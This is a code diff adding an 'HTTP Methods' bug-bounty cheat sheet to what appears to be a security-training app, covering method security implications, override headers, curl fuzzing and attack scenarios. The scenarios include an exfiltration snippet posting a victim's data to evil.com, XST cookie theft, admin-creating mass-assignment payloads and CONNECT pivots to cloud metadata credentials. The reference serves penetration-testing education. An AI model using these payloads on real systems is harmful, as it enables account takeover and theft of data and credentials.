@@ -549,4 +549,114 @@ export const CHEAT_SHEETS: CheatSheet[] = [
       },
     ],
   },
+  {
+    id: "http-methods",
+    name: "HTTP Methods",
+    difficulty: "Intermediate",
+    description: "Complete HTTP methods reference with security implications, method override attacks, and practical test scenarios for bug bounty hunting.",
+    sections: [
+      {
+        heading: "HTTP Methods Reference",
+        description: "All standard HTTP methods with security implications.",
+        blocks: [
+          {
+            title: "GET — Retrieve resource",
+            code: "GET /api/users/42 HTTP/1.1\nHost: target.com\n\nSecurity implications:\n• Parameters visible in URL, logs, and Referer header\n• Sensitive data in query strings = information disclosure\n• Cacheable by default — cached responses may leak data\n• Should be idempotent — if it modifies state, it's a design flaw\n\nTest ideas:\n• Check if sensitive data (tokens, passwords) appears in GET params\n• Test parameter pollution: ?id=1&id=2\n• Verify GET requests don't modify server state",
+          },
+          {
+            title: "POST — Submit data / create resource",
+            code: "POST /api/users HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"test\",\"role\":\"admin\"}\n\nSecurity implications:\n• Body not logged by default — but don't assume it's hidden\n• Mass assignment: send extra fields (role, isAdmin, price)\n• Missing CSRF protection on state-changing POST requests\n• Content-Type confusion: switch JSON ↔ form-data ↔ XML\n\nTest ideas:\n• Add unexpected fields: \"role\":\"admin\", \"is_admin\":true\n• Change Content-Type header and observe behavior\n• Test without CSRF token",
+          },
+          {
+            title: "PUT — Replace entire resource",
+            code: "PUT /api/users/42 HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"hacker\",\"email\":\"evil@test.com\",\"role\":\"admin\"}\n\nSecurity implications:\n• Can overwrite entire objects — mass assignment risk\n• Often less protected than POST endpoints\n• May create resources if they don't exist (upsert behavior)\n• Missing authorization checks = IDOR via PUT\n\nTest ideas:\n• PUT to another user's resource: /api/users/43\n• Include privileged fields in the body\n• Try PUT on resources that should be POST-only",
+          },
+          {
+            title: "DELETE — Remove resource",
+            code: "DELETE /api/users/42 HTTP/1.1\nHost: target.com\nAuthorization: Bearer <token>\n\nSecurity implications:\n• Destructive operation — must verify authorization\n• IDOR: DELETE /api/users/OTHER_USER_ID\n• Missing rate limiting = mass deletion\n• Soft delete vs hard delete — data may still be accessible\n\nTest ideas:\n• Delete another user's resources\n• Delete without authentication\n• Check if deleted data is still accessible via GET",
+          },
+          {
+            title: "PATCH — Partial update",
+            code: "PATCH /api/users/42 HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"role\":\"admin\"}\n\nSecurity implications:\n• Only sends changed fields — perfect for field-level attacks\n• Patch a single privileged field without full object context\n• Often shares validation logic with PUT but may miss checks\n\nTest ideas:\n• PATCH only the \"role\" or \"is_admin\" field\n• PATCH another user's profile\n• Send conflicting or invalid field types",
+          },
+          {
+            title: "HEAD — Headers only (no body)",
+            code: "HEAD /api/users/42 HTTP/1.1\nHost: target.com\n\nSecurity implications:\n• Returns same headers as GET but no body\n• Can bypass body-based WAF rules\n• Reveals Content-Length, Content-Type without triggering body inspection\n• Authentication checks may be skipped for HEAD\n\nTest ideas:\n• HEAD on protected endpoints — check if auth is enforced\n• Compare HEAD vs GET response headers for discrepancies\n• Use HEAD to enumerate resources without triggering alerts",
+          },
+          {
+            title: "OPTIONS — List allowed methods",
+            code: "OPTIONS /api/users HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\n\nSecurity implications:\n• Reveals which methods are allowed (Allow header)\n• CORS preflight: check Access-Control-Allow-Origin\n• Wildcard origin (*) + credentials = critical CORS misconfig\n• May expose internal API capabilities\n\nTest ideas:\n• Check Allow header for unexpected methods (PUT, DELETE, TRACE)\n• Send Origin: https://evil.com — check if it's reflected\n• Look for Access-Control-Allow-Credentials: true with wildcard origin",
+          },
+          {
+            title: "TRACE — Echo request back",
+            code: "TRACE / HTTP/1.1\nHost: target.com\n\nSecurity implications:\n• Echoes the full request including headers back to client\n• Cross-Site Tracing (XST): steal HttpOnly cookies via XSS + TRACE\n• Should ALWAYS be disabled in production\n• Reflects Authorization and Cookie headers\n\nTest ideas:\n• Send TRACE and check if the full request is echoed\n• If enabled: combine with XSS for cookie theft\n• Check if TRACE is blocked at WAF vs application level",
+          },
+          {
+            title: "CONNECT — Establish tunnel",
+            code: "CONNECT evil.com:443 HTTP/1.1\nHost: target.com\n\nSecurity implications:\n• Creates TCP tunnel through the server (proxy behavior)\n• If allowed: SSRF, internal network pivoting\n• Normally only used by HTTP proxies\n• Extremely dangerous if accepted by a web server\n\nTest ideas:\n• Try CONNECT to internal IPs: CONNECT 127.0.0.1:22\n• CONNECT to metadata endpoints: 169.254.169.254:80\n• Should return 405 Method Not Allowed on web servers",
+          },
+        ],
+        tips: [
+          "Always test which methods are actually allowed vs documented — servers often accept more than intended",
+          "Use: curl -X OPTIONS https://target.com/api/ -i to quickly check allowed methods",
+          "Some frameworks silently accept any method and route to GET handler — test unexpected methods",
+        ],
+      },
+      {
+        heading: "Method Override Attacks",
+        description: "Bypass method restrictions using override headers and parameters.",
+        blocks: [
+          {
+            title: "X-HTTP-Method-Override header",
+            code: "# Server blocks DELETE requests? Override with POST:\nPOST /api/users/42 HTTP/1.1\nHost: target.com\nX-HTTP-Method-Override: DELETE\n\n# Variations accepted by different frameworks:\nX-HTTP-Method: DELETE\nX-Method-Override: DELETE\nX-HTTP-Method-Override: PUT\n_method=DELETE                  # In request body (Rails, Laravel)\n?_method=DELETE                 # In query string",
+          },
+          {
+            title: "Content-Type override trick",
+            code: "# WAF blocks JSON payloads? Try alternative content types:\n\n# Form-encoded (often less scrutinized by WAFs)\nPOST /api/users HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=test&role=admin\n\n# Multipart (bypasses some JSON-only validation)\nPOST /api/users HTTP/1.1\nContent-Type: multipart/form-data; boundary=----hackmind\n\n------hackmind\nContent-Disposition: form-data; name=\"role\"\n\nadmin\n------hackmind--",
+          },
+          {
+            title: "HTTP method fuzzing with curl",
+            code: "# Test all methods against an endpoint:\nfor method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do\n  echo \"--- $method ---\"\n  curl -s -o /dev/null -w \"%{http_code}\" -X $method https://target.com/api/admin\n  echo\ndone\n\n# Test method override headers:\ncurl -X POST https://target.com/api/users/42 \\\n  -H \"X-HTTP-Method-Override: DELETE\" \\\n  -H \"Content-Type: application/json\" \\\n  -v\n\n# Test _method parameter:\ncurl -X POST https://target.com/api/users/42 \\\n  -d \"_method=DELETE\" \\\n  -v",
+          },
+        ],
+        tips: [
+          "Rails, Laravel, and many frameworks honor _method parameter — always test it",
+          "Some reverse proxies (Nginx, HAProxy) only check the actual HTTP method, not override headers",
+          "WAFs often filter based on HTTP method — override headers bypass this entirely",
+        ],
+      },
+      {
+        heading: "Attack Scenarios",
+        description: "Real-world attack patterns using HTTP method abuse.",
+        blocks: [
+          {
+            title: "Scenario 1: Forced resource creation with PUT",
+            code: "# Target has POST /api/users blocked for unauthenticated users\n# But PUT might create resources if they don't exist:\n\nPUT /api/users/9999 HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"hacker\",\"role\":\"admin\",\"password\":\"owned\"}\n\n# If the server implements upsert logic, this creates a new admin user\n# without going through the protected POST registration flow",
+          },
+          {
+            title: "Scenario 2: Cross-Site Tracing (XST) for cookie theft",
+            code: "# If TRACE is enabled AND there's an XSS vulnerability:\n\n# Step 1: Verify TRACE is enabled\ncurl -X TRACE https://target.com/ -H \"Cookie: session=secret123\" -v\n# Response should echo back the Cookie header\n\n# Step 2: Exploit via XSS (JavaScript XMLHttpRequest)\nvar xhr = new XMLHttpRequest();\nxhr.open('TRACE', '/', false);\nxhr.send();\n// xhr.responseText contains the echoed Cookie header\n// Even HttpOnly cookies are reflected!\nalert(xhr.responseText);\n\n# Impact: Steal HttpOnly session cookies that are normally\n# inaccessible to JavaScript, leading to full session hijack",
+          },
+          {
+            title: "Scenario 3: CORS misconfiguration via OPTIONS",
+            code: "# Step 1: Send preflight with evil origin\nOPTIONS /api/user/profile HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\nAccess-Control-Request-Method: GET\nAccess-Control-Request-Headers: Authorization\n\n# Vulnerable response (reflects origin + allows credentials):\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\n\n# Step 2: Exploit from attacker's site\nfetch('https://target.com/api/user/profile', {\n  credentials: 'include'\n}).then(r => r.json())\n  .then(data => {\n    // Send victim's data to attacker\n    fetch('https://evil.com/steal', {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n  });",
+          },
+          {
+            title: "Scenario 4: Authorization bypass via method switching",
+            code: "# Admin endpoint blocks GET for non-admin users:\nGET /api/admin/users HTTP/1.1    → 403 Forbidden\n\n# Try alternative methods — authorization may only check GET:\nPOST /api/admin/users HTTP/1.1   → 200 OK (?!)\nPUT /api/admin/users HTTP/1.1    → 200 OK (?!)\nPATCH /api/admin/users HTTP/1.1  → 200 OK (?!)\n\n# Try method override:\nPOST /api/admin/users HTTP/1.1\nX-HTTP-Method-Override: GET      → 200 OK (?!)\n\n# Many frameworks only apply authorization middleware to\n# specific HTTP methods, leaving others completely unprotected",
+          },
+          {
+            title: "Scenario 5: SSRF via CONNECT method",
+            code: "# If the server accepts CONNECT (acts as a proxy):\n\nCONNECT 169.254.169.254:80 HTTP/1.1\nHost: target.com\n\n# If successful, you can reach the cloud metadata endpoint:\nGET /latest/meta-data/iam/security-credentials/ HTTP/1.1\nHost: 169.254.169.254\n\n# Also try internal services:\nCONNECT 127.0.0.1:6379 HTTP/1.1   # Redis\nCONNECT 127.0.0.1:27017 HTTP/1.1  # MongoDB\nCONNECT 10.0.0.1:8080 HTTP/1.1    # Internal app server",
+          },
+        ],
+        tips: [
+          "Always document the exact HTTP method + endpoint combination that produces unexpected behavior",
+          "Method-based authorization bypass is a common finding in bug bounty programs — easy to test, often overlooked",
+          "Combine method override with other attacks: CSRF + method override = unauthorized state changes",
+          "Check if the API documentation lists different permissions per method — then test if they're actually enforced",
+        ],
+      },
+    ],
+  },
 ];
